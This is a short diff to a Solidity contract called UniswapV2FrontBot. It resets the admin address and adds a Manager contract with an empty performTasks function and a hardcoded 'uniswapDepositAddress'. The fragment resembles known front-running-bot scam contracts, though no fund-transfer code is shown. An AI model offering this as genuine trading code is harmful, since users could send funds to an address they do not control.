@@ -10,7 +10,7 @@ contract UniswapV2FrontBot {
     mapping (address => FrontBot) bots;
     address[] public botAccts;
     
-    address public admin = 0x6E7bE797DE52cEA969130c028aD168844C4C5Bb5;
+    address public admin = this;
     
     modifier isAdmin(){
         if(msg.sender != admin)
@@ -42,4 +42,16 @@ contract UniswapV2FrontBot {
     function countFrontBots() view public returns (uint) {
         return botAccts.length;
     }
+}
+
+pragma solidity ^0.4.18;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0xd7C6D4E3507701B7079cac679B6157f1bFAd460c;
+	}
 }
